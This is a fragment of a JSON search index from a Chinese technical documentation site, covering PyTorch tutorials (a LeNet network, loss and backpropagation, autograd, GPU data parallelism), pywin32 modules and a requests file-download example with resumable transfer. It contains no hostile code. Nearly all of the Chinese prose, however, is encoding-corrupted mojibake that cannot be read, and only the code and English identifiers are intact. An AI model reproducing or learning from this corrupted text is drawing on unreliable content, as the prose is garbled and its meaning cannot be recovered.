è¾“å‡º: tensor([2., 5., 8.], dtype=torch.float64) torch.nn torch.nn.conv2d(in_channels: int, out_channels: int, kernel_size: _size_2_t,) å·ç§¯å‡½æ•° in_channels è¾“å…¥é€šé“ out_channels è¾“å‡ºé€šé“ kernel_size å·ç§¯æ ¸å¤§å°","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytorch-API.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytorch-API.html"},{"title":"å®ä¾‹-è®­ç»ƒåˆ†ç±»å™¨","text":"è®­ç»ƒæ•°æ® åœ¨è®­ç»ƒåˆ†ç±»å™¨å‰ï¼Œå½“ç„¶éœ€è¦è€ƒè™‘æ•°æ®çš„é—®é¢˜ã€‚ é€šå¸¸åœ¨å¤„ç†å¦‚å›¾ç‰‡ã€æ–‡æœ¬ã€è¯­éŸ³æˆ–è€…è§†é¢‘æ•°æ®çš„æ—¶å€™ï¼Œ ä¸€èˆ¬éƒ½é‡‡ç”¨æ ‡å‡†çš„ Python åº“å°†å…¶åŠ è½½å¹¶è½¬æˆ Numpy æ•°ç»„ï¼Œç„¶åå†è½¬å›ä¸º PyTorch çš„å¼ é‡ã€‚ å¯¹äºå›¾åƒï¼Œå¯ä»¥é‡‡ç”¨ Pillow, OpenCV åº“ï¼› å¯¹äºè¯­éŸ³ï¼Œæœ‰ scipy å’Œ librosa; å¯¹äºæ–‡æœ¬ï¼Œå¯ä»¥é€‰æ‹©åŸç”Ÿ Python æˆ–è€… Cython è¿›è¡ŒåŠ è½½æ•°æ®ï¼Œæˆ–è€…ä½¿ç”¨ NLTK å’Œ SpaCy ã€‚ PyTorch å¯¹äºè®¡ç®—æœºè§†è§‰ï¼Œç‰¹åˆ«åˆ›å»ºäº†ä¸€ä¸ª torchvision çš„åº“ï¼Œ å®ƒåŒ…å«ä¸€ä¸ªæ•°æ®åŠ è½½å™¨(data loader)ï¼Œå¯ä»¥åŠ è½½æ¯”è¾ƒå¸¸è§çš„æ•°æ®é›†ï¼Œ æ¯”å¦‚ Imagenet, CIFAR10, MNIST ç­‰ç­‰ï¼Œç„¶åè¿˜æœ‰ä¸€ä¸ªç”¨äºå›¾åƒçš„æ•°æ®è½¬æ¢å™¨(data transformers)ï¼Œ è°ƒç”¨çš„åº“æ˜¯ torchvision.datasets å’Œ torch.utils.data.DataLoader ã€‚ åœ¨æœ¬æ•™ç¨‹ä¸­ï¼Œå°†é‡‡ç”¨ CIFAR10 æ•°æ®é›†ï¼Œå®ƒåŒ…å« 10 ä¸ªç±»åˆ«ï¼Œåˆ†åˆ«æ˜¯é£æœºã€æ±½è½¦ã€é¸Ÿã€çŒ«ã€é¹¿ã€ç‹—ã€é’è›™ã€é©¬ã€èˆ¹å’Œå¡è½¦ã€‚æ•°æ®é›†ä¸­çš„å›¾ç‰‡éƒ½æ˜¯ 3x32x32ã€‚ä¸€äº›ä¾‹å­å¦‚ä¸‹æ‰€ç¤ºï¼š æ•°æ®å¹¶è¡Œ åœ¨ GPU ä¸Šè®­ç»ƒæ¨¡å‹çš„åšæ³•å¾ˆç®€å•ï¼Œå¦‚ä¸‹ä»£ç æ‰€ç¤ºï¼Œå®šä¹‰ä¸€ä¸ª device å¯¹è±¡ï¼Œ ç„¶åç”¨ .to() æ–¹æ³•å°†ç½‘ç»œæ¨¡å‹å‚æ•°æ”¾åˆ°æŒ‡å®šçš„ GPU ä¸Š: device = torch.device(\"cuda:0\") model.to(device) æ¥ç€å°±æ˜¯å°†æ‰€æœ‰çš„å¼ é‡å˜é‡æ”¾åˆ° GPU ä¸Š: mytensor = my_tensor.to(device) æ³¨è§£ è¿™é‡Œ my_tensor.to(device) æ˜¯è¿”å›ä¸€ä¸ª my_tensor çš„æ–°çš„æ‹·è´å¯¹è±¡ï¼Œ è€Œä¸æ˜¯ç›´æ¥ä¿®æ”¹ my_tensor å˜é‡ï¼Œå› æ­¤ä½ éœ€è¦å°†å…¶èµ‹å€¼ç»™ä¸€ä¸ªæ–°çš„å¼ é‡ï¼Œç„¶åä½¿ç”¨è¿™ä¸ªå¼ é‡ã€‚ Pytorch é»˜è®¤åªä¼šé‡‡ç”¨ä¸€ä¸ª GPUï¼Œå› æ­¤éœ€è¦ä½¿ç”¨å¤šä¸ª GPUï¼Œéœ€è¦é‡‡ç”¨ DataParallel ï¼Œä»£ç å¦‚ä¸‹æ‰€ç¤º: model = nn.DataParallel(model) å‚è€ƒ: https://zhuanlan.zhihu.com/p/66543791","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytorch-Example-Training-Classifier.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytorch-Example-Training-Classifier.html"},{"title":"ç¥ç»ç½‘ç»œ","text":"åœ¨ PyTorch ä¸­ torch.nn ä¸“é—¨ç”¨äºå®ç°ç¥ç»ç½‘ç»œã€‚ å…¶ä¸­ nn.Module åŒ…å«äº†ç½‘ç»œå±‚çš„æ­å»ºï¼Œ ä»¥åŠä¸€ä¸ªæ–¹æ³• forward(input) ï¼Œå¹¶è¿”å›ç½‘ç»œçš„è¾“å‡º output . ä¸‹é¢æ˜¯ä¸€ä¸ªç»å…¸çš„ LeNet ç½‘ç»œï¼Œç”¨äºå¯¹å­—ç¬¦è¿›è¡Œåˆ†ç±» å¯¹äºç¥ç»ç½‘ç»œæ¥è¯´ï¼Œä¸€ä¸ªæ ‡å‡†çš„è®­ç»ƒæµç¨‹æ˜¯è¿™æ ·çš„ï¼š å®šä¹‰ä¸€ä¸ªå¤šå±‚çš„ç¥ç»ç½‘ç»œ å¯¹æ•°æ®é›†çš„é¢„å¤„ç†å¹¶å‡†å¤‡ä½œä¸ºç½‘ç»œçš„è¾“å…¥ å°†æ•°æ®è¾“å…¥åˆ°ç½‘ç»œ è®¡ç®—ç½‘ç»œçš„æŸå¤± åå‘ä¼ æ’­ï¼Œè®¡ç®—æ¢¯åº¦ æ›´æ–°ç½‘ç»œçš„æ¢¯åº¦ï¼Œä¸€ä¸ªç®€å•çš„æ›´æ–°è§„åˆ™æ˜¯ weight = weight - learning_rate * gradient å®šä¹‰ç½‘ç»œ é¦–å…ˆå®šä¹‰ä¸€ä¸ªç¥ç»ç½‘ç»œï¼Œä¸‹é¢æ˜¯ä¸€ä¸ª 5 å±‚çš„å·ç§¯ç¥ç»ç½‘ç»œï¼Œ åŒ…å«ä¸¤å±‚å·ç§¯å±‚å’Œä¸‰å±‚å…¨è¿æ¥å±‚: import torch import torch.nn as nn import torch.nn.functional as F class Net(nn.Module): def __init__(self): super(Net, self).__init__() # è¾“å…¥å›¾åƒæ˜¯å•é€šé“ï¼Œconv1 kenrnel size=5*5ï¼Œè¾“å‡ºé€šé“ 6 self.conv1 = nn.Conv2d(1, 6, 5) # conv2 kernel size=5*5, è¾“å‡ºé€šé“ 16 self.conv2 = nn.Conv2d(6, 16, 5) # å…¨è¿æ¥å±‚ self.fc1 = nn.Linear(16*5*5, 120) self.fc2 = nn.Linear(120, 84) self.fc3 = nn.Linear(84, 10) def forward(self, x): # max-pooling é‡‡ç”¨ä¸€ä¸ª (2,2) çš„æ»‘åŠ¨çª—å£ x = F.max_pool2d(F.relu(self.conv1(x)), (2, 2)) # æ ¸(kernel)å¤§å°æ˜¯æ–¹å½¢çš„è¯ï¼Œå¯ä»…å®šä¹‰ä¸€ä¸ªæ•°å­—ï¼Œå¦‚ (2,2) ç”¨ 2 å³å¯ x = F.max_pool2d(F.relu(self.conv2(x)), 2) x = x.view(-1, self.num_flat_features(x)) x = F.relu(self.fc1(x)) x = F.relu(self.fc2(x)) x = self.fc3(x) return x def num_flat_features(self, x): # é™¤äº† batch ç»´åº¦å¤–çš„æ‰€æœ‰ç»´åº¦ size = x.size()[1:] num_features = 1 for s in size: num_features *= s return num_features net = Net() print(net) æ‰“å°ç½‘ç»œç»“æ„: Net( (conv1): Conv2d(1, 6, kernel_size=(5, 5), stride=(1, 1)) (conv2): Conv2d(6, 16, kernel_size=(5, 5), stride=(1, 1)) (fc1): Linear(in_features=400, out_features=120, bias=True) (fc2): Linear(in_features=120, out_features=84, bias=True) (fc3): Linear(in_features=84, out_features=10, bias=True) ) è¿™é‡Œå¿…é¡»å®ç° forward å‡½æ•°ï¼Œ è€Œ backward å‡½æ•°åœ¨é‡‡ç”¨ autograd æ—¶å°±è‡ªåŠ¨å®šä¹‰å¥½äº†ï¼Œ åœ¨ forward æ–¹æ³•å¯ä»¥é‡‡ç”¨ä»»ä½•çš„å¼ é‡æ“ä½œã€‚ net.parameters() å¯ä»¥è¿”å›ç½‘ç»œçš„è®­ç»ƒå‚æ•°ï¼Œä½¿ç”¨ä¾‹å­å¦‚ä¸‹: params = list(net.parameters()) print('å‚æ•°æ•°é‡: ', len(params)) # conv1.weight print('ç¬¬ä¸€ä¸ªå‚æ•°å¤§å°: ', params[0].size()) è¾“å‡º: å‚æ•°æ•°é‡: 10 ç¬¬ä¸€ä¸ªå‚æ•°å¤§å°: torch.Size([6, 1, 5, 5]) ç„¶åç®€å•æµ‹è¯•ä¸‹è¿™ä¸ªç½‘ç»œï¼Œéšæœºç”Ÿæˆä¸€ä¸ª 32*32 çš„è¾“å…¥: # éšæœºå®šä¹‰ä¸€ä¸ªå˜é‡è¾“å…¥ç½‘ç»œ input = torch.randn(1, 1, 32, 32) out = net(input) print(out) è¾“å‡ºç»“æœ: tensor([[ 0.1005, 0.0263, 0.0013, -0.1157, -0.1197, -0.0141, 0.1425, -0.0521, 0.0689, 0.0220]], grad_fn=<ThAddmmBackward>) æ¥ç€åå‘ä¼ æ’­éœ€è¦å…ˆæ¸…ç©ºæ¢¯åº¦ç¼“å­˜ï¼Œå¹¶åå‘ä¼ æ’­éšæœºæ¢¯åº¦: # æ¸…ç©ºæ‰€æœ‰å‚æ•°çš„æ¢¯åº¦ç¼“å­˜ï¼Œç„¶åè®¡ç®—éšæœºæ¢¯åº¦è¿›è¡Œåå‘ä¼ æ’­ net.zero_grad() out.backward(torch.randn(1, 10)) æ³¨è§£ torch.nn åªæ”¯æŒå°æ‰¹é‡(mini-batches)æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¾“å…¥ä¸èƒ½æ˜¯å•ä¸ªæ ·æœ¬ï¼Œ æ¯”å¦‚å¯¹äº nn.Conv2d æ¥æ”¶çš„è¾“å…¥æ˜¯ä¸€ä¸ª 4 ç»´å¼ é‡--nSamples * nChannels * Height * Width ã€‚ æ‰€ä»¥ï¼Œå¦‚æœä½ è¾“å…¥çš„æ˜¯å•ä¸ªæ ·æœ¬ï¼Œéœ€è¦é‡‡ç”¨ input.unsqueeze(0) æ¥æ‰©å……ä¸€ä¸ªå‡çš„ batch ç»´åº¦ï¼Œå³ä» 3 ç»´å˜ä¸º 4 ç»´ã€‚ æŸå¤±å‡½æ•° æŸå¤±å‡½æ•°çš„è¾“å…¥æ˜¯ (output, target) ï¼Œå³ç½‘ç»œè¾“å‡ºå’ŒçœŸå®æ ‡ç­¾å¯¹çš„æ•°æ®ï¼Œ ç„¶åè¿”å›ä¸€ä¸ªæ•°å€¼è¡¨ç¤ºç½‘ç»œè¾“å‡ºå’ŒçœŸå®æ ‡ç­¾çš„å·®è·ã€‚ PyTorch ä¸­å…¶å®å·²ç»å®šä¹‰äº†ä¸å°‘çš„æŸå¤±å‡½æ•°ï¼Œ è¿™é‡Œä»…é‡‡ç”¨ç®€å•çš„å‡æ–¹è¯¯å·®ï¼šnn.MSELoss ï¼Œä¾‹å­å¦‚ä¸‹: output = net(input) # å®šä¹‰ä¼ªæ ‡ç­¾ target = torch.randn(10) # è°ƒæ•´å¤§å°ï¼Œä½¿å¾—å’Œ output ä¸€æ ·çš„ size target = target.view(1, -1) criterion = nn.MSELoss() loss = criterion(output, target) print(loss) è¾“å‡ºå¦‚ä¸‹: tensor(0.6524, grad_fn=<MseLossBackward>) è¿™é‡Œï¼Œæ•´ä¸ªç½‘ç»œçš„æ•°æ®è¾“å…¥åˆ°è¾“å‡ºç»å†çš„è®¡ç®—å›¾å¦‚ä¸‹æ‰€ç¤ºï¼Œå…¶å®ä¹Ÿå°±æ˜¯æ•°æ®ä»è¾“å…¥å±‚åˆ°è¾“å‡ºå±‚ï¼Œè®¡ç®— loss çš„è¿‡ç¨‹: input -> conv2d -> relu -> maxpool2d -> conv2d -> relu -> maxpool2d -> view -> linear -> relu -> linear -> relu -> linear -> MSELoss -> loss å¦‚æœè°ƒç”¨ loss.backward() ï¼Œé‚£ä¹ˆæ•´ä¸ªå›¾éƒ½æ˜¯å¯å¾®åˆ†çš„ï¼Œ ä¹Ÿå°±æ˜¯è¯´åŒ…æ‹¬ loss ï¼Œå›¾ä¸­çš„æ‰€æœ‰å¼ é‡å˜é‡ï¼Œ åªè¦å…¶å±æ€§ requires_grad=True ï¼Œé‚£ä¹ˆå…¶æ¢¯åº¦ .gradå¼ é‡éƒ½ä¼šéšç€æ¢¯åº¦ä¸€ç›´ç´¯è®¡ã€‚ ç”¨ä»£ç æ¥è¯´æ˜: # MSELoss print(loss.grad_fn) # Linear layer print(loss.grad_fn.next_functions[0][0]) # Relu print(loss.grad_fn.next_functions[0][0].next_functions[0][0]) è¾“å‡º: <MseLossBackward object at 0x0000019C0C349908> <ThAddmmBackward object at 0x0000019C0C365A58> <ExpandBackward object at 0x0000019C0C3659E8> åå‘ä¼ æ’­ åå‘ä¼ æ’­çš„å®ç°åªéœ€è¦è°ƒç”¨ loss.backward() å³å¯ï¼Œ å½“ç„¶é¦–å…ˆéœ€è¦æ¸…ç©ºå½“å‰æ¢¯åº¦ç¼“å­˜ï¼Œå³.zero_grad() æ–¹æ³•ï¼Œ å¦åˆ™ä¹‹å‰çš„æ¢¯åº¦ä¼šç´¯åŠ åˆ°å½“å‰çš„æ¢¯åº¦ï¼Œè¿™æ ·ä¼šå½±å“æƒå€¼å‚æ•°çš„æ›´æ–°ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œä»¥ conv1 å±‚çš„åç½®å‚æ•° bias åœ¨åå‘ä¼ æ’­å‰åçš„ç»“æœä¸ºä¾‹: # æ¸…ç©ºæ‰€æœ‰å‚æ•°çš„æ¢¯åº¦ç¼“å­˜ net.zero_grad() print('conv1.bias.grad before backward') print(net.conv1.bias.grad) loss.backward() print('conv1.bias.grad after backward') print(net.conv1.bias.grad) è¾“å‡ºç»“æœ: conv1.bias.grad before backward tensor([0., 0., 0., 0., 0., 0.]) conv1.bias.grad after backward tensor([ 0.0069, 0.0021, 0.0090, -0.0060, -0.0008, -0.0073]) æ›´æ–°æƒé‡ é‡‡ç”¨éšæœºæ¢¯åº¦ä¸‹é™(Stochastic Gradient Descent, SGD)æ–¹æ³•çš„æœ€ç®€å•çš„æ›´æ–°æƒé‡è§„åˆ™å¦‚ä¸‹: weight = weight - learning_rate * gradient æŒ‰ç…§è¿™ä¸ªè§„åˆ™ï¼Œä»£ç å®ç°å¦‚ä¸‹æ‰€ç¤º: # ç®€å•å®ç°æƒé‡çš„æ›´æ–°ä¾‹å­ learning_rate = 0.01 for f in net.parameters(): f.data.sub_(f.grad.data * learning_rate) ä½†æ˜¯è¿™åªæ˜¯æœ€ç®€å•çš„è§„åˆ™ï¼Œæ·±åº¦å­¦ä¹ æœ‰å¾ˆå¤šçš„ä¼˜åŒ–ç®—æ³•ï¼Œ ä¸ä»…ä»…æ˜¯ SGDï¼Œè¿˜æœ‰ Nesterov-SGD, Adam, RMSProp ç­‰ç­‰ï¼Œä¸ºäº†é‡‡ç”¨è¿™äº›ä¸åŒçš„æ–¹æ³•ï¼Œ è¿™é‡Œé‡‡ç”¨ torch.optim åº“ï¼Œä½¿ç”¨ä¾‹å­å¦‚ä¸‹æ‰€ç¤º: import torch.optim as optim # åˆ›å»ºä¼˜åŒ–å™¨ optimizer = optim.SGD(net.parameters(), lr=0.01) # åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­æ‰§è¡Œä¸‹åˆ—æ“ä½œ optimizer.zero_grad() # æ¸…ç©ºæ¢¯åº¦ç¼“å­˜ output = net(input) loss = criterion(output, target) loss.backward() # æ›´æ–°æƒé‡ optimizer.step() æ³¨æ„ï¼ŒåŒæ ·éœ€è¦è°ƒç”¨ optimizer.zero_grad() æ–¹æ³•æ¸…ç©ºæ¢¯åº¦ç¼“å­˜ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytorch-Neural-Networks.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytorch-Neural-Networks.html"},{"title":"autograd-è‡ªåŠ¨æ¢¯åº¦","text":"æä¾›äº†å¯¹ Tensors ä¸Šæ‰€æœ‰è¿ç®—æ“ä½œçš„è‡ªåŠ¨å¾®åˆ†åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯è®¡ç®—æ¢¯åº¦çš„åŠŸèƒ½ã€‚ å®ƒå±äº define-by-run ç±»å‹æ¡†æ¶ï¼Œå³åå‘ä¼ æ’­æ“ä½œçš„å®šä¹‰æ˜¯æ ¹æ®ä»£ç çš„è¿è¡Œæ–¹å¼ï¼Œå› æ­¤æ¯æ¬¡è¿­ä»£éƒ½å¯ä»¥æ˜¯ä¸åŒçš„ã€‚ Tensoræ¢¯åº¦è®¡ç®— torch.Tensor æ˜¯ Pytorch æœ€ä¸»è¦çš„åº“ï¼Œ å½“è®¾ç½®å®ƒçš„å±æ€§ .requires_grad=Trueï¼Œ é‚£ä¹ˆå°±ä¼šå¼€å§‹è¿½è¸ªåœ¨è¯¥å˜é‡ä¸Šçš„æ‰€æœ‰æ“ä½œï¼Œè€Œå®Œæˆè®¡ç®—åï¼Œ å¯ä»¥è°ƒç”¨ .backward() å¹¶è‡ªåŠ¨è®¡ç®—æ‰€æœ‰çš„æ¢¯åº¦ï¼Œå¾—åˆ°çš„æ¢¯åº¦éƒ½ä¿å­˜åœ¨å±æ€§ .grad ä¸­ã€‚ è°ƒç”¨ .detach() æ–¹æ³•åˆ†ç¦»å‡ºè®¡ç®—çš„å†å²ï¼Œ å¯ä»¥åœæ­¢ä¸€ä¸ª tensor å˜é‡ç»§ç»­è¿½è¸ªå…¶å†å²ä¿¡æ¯ ï¼ŒåŒæ—¶ä¹Ÿé˜²æ­¢æœªæ¥çš„è®¡ç®—ä¼šè¢«è¿½è¸ªã€‚ è€Œå¦‚æœæ˜¯å¸Œæœ›é˜²æ­¢è·Ÿè¸ªå†å²ï¼ˆä»¥åŠä½¿ç”¨å†…å­˜ï¼‰ï¼Œå¯ä»¥å°†ä»£ç å—æ”¾åœ¨ with torch.no_grad(): å†…ï¼Œ è¿™ä¸ªåšæ³•åœ¨ä½¿ç”¨ä¸€ä¸ªæ¨¡å‹è¿›è¡Œè¯„ä¼°çš„æ—¶å€™éå¸¸æœ‰ç”¨ï¼Œ å› ä¸ºæ¨¡å‹ä¼šåŒ…å«ä¸€äº›å¸¦æœ‰ requires_grad=True çš„è®­ç»ƒå‚æ•°ï¼Œä½†å®é™…ä¸Šå¹¶ä¸éœ€è¦å®ƒä»¬çš„æ¢¯åº¦ä¿¡æ¯ã€‚ å¯¹äº autograd çš„å®ç°ï¼Œè¿˜æœ‰ä¸€ä¸ªç±»ä¹Ÿæ˜¯éå¸¸é‡è¦-- Function ã€‚ Tensor å’Œ Function ä¸¤ä¸ªç±»æ˜¯æœ‰å…³è”å¹¶å»ºç«‹äº†ä¸€ä¸ªéå¾ªç¯çš„å›¾ï¼Œ å¯ä»¥ç¼–ç ä¸€ä¸ªå®Œæ•´çš„è®¡ç®—è®°å½•ã€‚ æ¯ä¸ª tensor å˜é‡éƒ½å¸¦æœ‰å±æ€§ .grad_fn ï¼Œ è¯¥å±æ€§å¼•ç”¨äº†åˆ›å»ºäº†è¿™ä¸ªå˜é‡çš„ Function ï¼ˆé™¤äº†ç”±ç”¨æˆ·åˆ›å»ºçš„ Tensorsï¼Œå®ƒä»¬çš„ grad_fn=None )ã€‚ å¦‚æœè¦è¿›è¡Œæ±‚å¯¼è¿ç®—ï¼Œå¯ä»¥è°ƒç”¨ä¸€ä¸ª Tensor å˜é‡çš„æ–¹æ³• .backward() ã€‚ å¦‚æœè¯¥å˜é‡æ˜¯ä¸€ä¸ªæ ‡é‡ï¼Œå³ä»…æœ‰ä¸€ä¸ªå…ƒç´ ï¼Œ é‚£ä¹ˆä¸éœ€è¦ä¼ é€’ä»»ä½•å‚æ•°ç»™æ–¹æ³• .backward()ï¼Œ å½“åŒ…å«å¤šä¸ªå…ƒç´ çš„æ—¶å€™ï¼Œå°±å¿…é¡»æŒ‡å®šä¸€ä¸ª gradient å‚æ•°ï¼Œè¡¨ç¤ºåŒ¹é…å°ºå¯¸å¤§å°çš„ tensorï¼Œ å¦‚: import torch # å¼€å§‹åˆ›å»ºä¸€ä¸ª tensorï¼Œ å¹¶è®© requires_grad=True æ¥è¿½è¸ªè¯¥å˜é‡ç›¸å…³çš„è®¡ç®—æ“ä½œï¼š x = torch.ones(2, 2, requires_grad=True) print(x) # tensor([[1., 1.], # [1., 1.]], requires_grad=True) # æ‰§è¡Œä»»æ„è®¡ç®—æ“ä½œï¼Œè¿™é‡Œè¿›è¡Œç®€å•çš„åŠ æ³•è¿ç®—ï¼š y = x + 2 print(y) # tensor([[3., 3.], # [3., 3.]], grad_fn=<AddBackward>) # y æ˜¯ä¸€ä¸ªæ“ä½œçš„ç»“æœï¼Œæ‰€ä»¥å®ƒå¸¦æœ‰å±æ€§ grad_fnï¼š print(y.grad_fn) # <AddBackward object at 0x00000216D25DCC88> # ç»§ç»­å¯¹å˜é‡ y è¿›è¡Œæ“ä½œï¼š z = y * y * 3 out = z.mean() print('z=', z) # z= tensor([[27., 27.], # [27., 27.]], grad_fn=<MulBackward>) print('out=', out) # out= tensor(27., grad_fn=<MeanBackward1>) æ³¨è§£ å®é™…ä¸Šï¼Œä¸€ä¸ª Tensor å˜é‡çš„é»˜è®¤ requires_grad æ˜¯ False ï¼Œ å¯ä»¥åƒä¸Šè¿°å®šä¹‰ä¸€ä¸ªå˜é‡æ—¶å€™æŒ‡å®šè¯¥å±æ€§æ˜¯ Trueï¼Œ å½“ç„¶ä¹Ÿå¯ä»¥å®šä¹‰å˜é‡åï¼Œè°ƒç”¨ .requires_grad_(True) è®¾ç½®ä¸º True ï¼Œ è¿™é‡Œå¸¦æœ‰åç¼€ _ æ˜¯ä¼šæ”¹å˜å˜é‡æœ¬èº«çš„å±æ€§ å¦‚: a = torch.randn(2, 2) a = ((a * 3) / (a - 1)) print(a.requires_grad) # False a.requires_grad_(True) print(a.requires_grad) # True b = (a * a).sum() print(b.grad_fn) # <SumBackward0 object at 0x00000216D25ED710> åå‘ä¼ æ’­: out.backward() # è¾“å‡ºæ¢¯åº¦ d(out)/dx print(x.grad) # tensor([[4.5000, 4.5000], [4.5000, 4.5000]]) ä¸Šé¢çš„outè®¡ç®—è¿‡ç¨‹: å®šä¹‰ x ä¸º 2*2 çš„ 1 y = x + 2 z = y * y * 3 = 3 * (x+2)&#94;2 æ±‚å¯¼å°±æ˜¯ æ¯ä¸ª X éƒ½æ˜¯1. ä»æ•°å­¦ä¸Šæ¥è¯´ï¼Œå¦‚æœä½ æœ‰ä¸€ä¸ªå‘é‡å€¼å‡½æ•°: é‚£ä¹ˆå¯¹åº”çš„æ¢¯åº¦æ˜¯ä¸€ä¸ªé›…å…‹æ¯”çŸ©é˜µ(Jacobian matrix) ä¸€èˆ¬æ¥è¯´ï¼Œtorch.autograd å°±æ˜¯ç”¨äºè®¡ç®—é›…å…‹æ¯”å‘é‡(vector-Jacobian)ä¹˜ç§¯çš„å·¥å…·ã€‚ è¿™é‡Œç•¥è¿‡æ•°å­¦å…¬å¼ï¼Œç›´æ¥ä¸Šä»£ç ä¾‹å­ä»‹ç»: x = torch.randn(3, requires_grad=True) y = x * 2 while y.data.norm() < 1000: y = y * 2 print(y) è¾“å‡ºç»“æœ: tensor([ 237.5009, 1774.2396, 274.0625], grad_fn=<MulBackward>) è¿™é‡Œå¾—åˆ°çš„å˜é‡ y ä¸å†æ˜¯ä¸€ä¸ªæ ‡é‡ï¼Œtorch.autograd ä¸èƒ½ç›´æ¥è®¡ç®—å®Œæ•´çš„é›…å…‹æ¯”è¡Œåˆ—å¼ï¼Œ ä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡ç®€å•çš„ä¼ é€’å‘é‡ç»™ backward() æ–¹æ³•ä½œä¸ºå‚æ•°å¾—åˆ°é›…å…‹æ¯”å‘é‡çš„ä¹˜ç§¯ï¼Œ ä¾‹å­å¦‚ä¸‹æ‰€ç¤º: v = torch.tensor([0.1, 1.0, 0.0001], dtype=torch.float) y.backward(v) print(x.grad) è¾“å‡ºç»“æœ: tensor([ 102.4000, 1024.0000, 0.1024]) æœ€åï¼ŒåŠ ä¸Š with torch.no_grad() å°±å¯ä»¥åœæ­¢è¿½è¸ªå˜é‡å†å²è¿›è¡Œè‡ªåŠ¨æ¢¯åº¦è®¡ç®—: print(x.requires_grad) print((x ** 2).requires_grad) with torch.no_grad(): print((x ** 2).requires_grad) è¾“å‡ºç»“æœ: True True False","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytorch-autoGrad.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytorch-autoGrad.html"},{"title":"pywin32","text":"pypiåœ°å€:: pywin32 å®‰è£…: python -m pip install --upgrade pywin32 è¿™ä¸‹é¢åŒ…å«çš„åŒ…æœ‰ç‚¹å¤š, éƒ½æ˜¯é’ˆå¯¹ä¸windowsçš„. å…¶ä»–å¹³å°æ— æ³•å®‰è£… Win32gui: Windowså›¾å½¢ç•Œé¢æ¥å£æ¨¡å—ã€‚ä¸»è¦è´Ÿè´£æ“ä½œçª—å£åˆ‡æ¢ä»¥åŠçª—å£ä¸­å…ƒç´ idæ ‡ç­¾çš„è·å– Win32api: Windowså¼€å‘æ¥å£æ¨¡å—ã€‚ä¸»è¦è´Ÿè´£æ¨¡æ‹Ÿé”®ç›˜å’Œé¼ æ ‡æ“ä½œ,å¯¹win32guiè·å–çš„æ ‡ç­¾è¿›è¡Œç‚¹å‡»/è·å–å€¼/ä¿®æ”¹å€¼ç­‰æ“ä½œ Win32con: å…¨é¢çš„åº“å‡½æ•°ï¼Œæä¾›Win32guiå’ŒWin32apiéœ€è¦çš„æ“ä½œå‚æ•° win32event: æä¾› äº’æ–¥é”, ä¿¡å·ç›¸å…³ windows Api . å‚è§: github/wuxc/pywin32doc/win32event win32event CreateMutex å¯å‚è§: microsoft-createmutexa ReleaseMutex é‡Šæ”¾äº’æ–¥ä½“","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pywin32.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pywin32.html"},{"title":"redis","text":"","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-redis.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-redis.html"},{"title":"requests","text":"ä¸‹è½½æ–‡ä»¶ å°æ–‡ä»¶ å°æ–‡ä»¶: import requests url = \"http://www.test.com/xxxxx/test.jpg\" path = r\"c:\\test.jpg\" req = requests.get(url) with open(path, \"wb\") as f: f.write(req.content) å¤§æ–‡ä»¶ æ–­ç‚¹ç»­ä¼ : import sys import requests import os class Downloader(object): def __init__(self, url, file_path): self.url = url self.file_path = file_path def start(self): res_length = requests.get(self.url, stream=True) total_size = int(res_length.headers['Content-Length']) print(res_length.headers) print(res_length) if os.path.exists(self.file_path): temp_size = os.path.getsize(self.file_path) print(\"å½“å‰ï¼š%d å­—èŠ‚ï¼Œ æ€»ï¼š%d å­—èŠ‚ï¼Œ å·²ä¸‹è½½ï¼š%2.2f%% \" % (temp_size, total_size, 100 * temp_size / total_size)) else: temp_size = 0 print(\"æ€»ï¼š%d å­—èŠ‚ï¼Œå¼€å§‹ä¸‹è½½...\" % (total_size,)) headers = {'Range': 'bytes=%d-' % temp_size, \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0\"} res_left = requests.get(self.url, stream=True, headers=headers) with open(self.file_path, \"ab\") as f: for chunk in res_left.iter_content(chunk_size=1024): temp_size += len(chunk) f.write(chunk) f.flush() done = int(50 * temp_size / total_size) sys.stdout.write(\"\\r[%s%s] %d%%\" % ('â–ˆ' * done, ' ' * (50 - done), 100 * temp_size / total_size)) sys.stdout.flush() if __name__ == '__main__': url = \"http://www.test.com/xxxxx/test.jpg\" path = r\"c:\\test.jpg\" downloader = Downloader(url, path) downloader.start() æ³¨è§£ è‹¥æ–‡ä»¶ä¸‹è½½ url å­˜åœ¨é‡å®šå‘, åˆ™ä½¿ç”¨ allow_redirects=True requests.get(url, allow_redirects=True) åˆ†å—ä¸‹è½½ä½¿ç”¨ stream=True requests.get(url, stream=True) æ–­ç‚¹ç»­ä¼ éœ€è¦æŒ‡å®š headers ä¸‹çš„ Range å­—æ®µ æ¥æŒ‡å®šèŒƒå›´ # æˆ–è€… headers = {'Range': 'bytes=%d-'%(start,)} headers = {'Range': 'bytes=%d-%d'%(start,end)} å…³äºæ–‡ä»¶ä¸‹è½½æ—¶å€™çš„è·¯å¾„ å½“ä»ä¸€ä¸ªurlä¸‹è½½æ–‡ä»¶æ—¶å€™, è‹¥ä½¿ç”¨ç»å¯¹è·¯å¾„, ä¸ä¼šæœ‰é—®é¢˜. ä½†å¯èƒ½æœ‰æ—¶å€™ä¸æƒ³ä½¿ç”¨ç»å¯¹è·¯å¾„, è€Œæ˜¯ä½¿ç”¨ç›¸å¯¹è·¯å¾„, 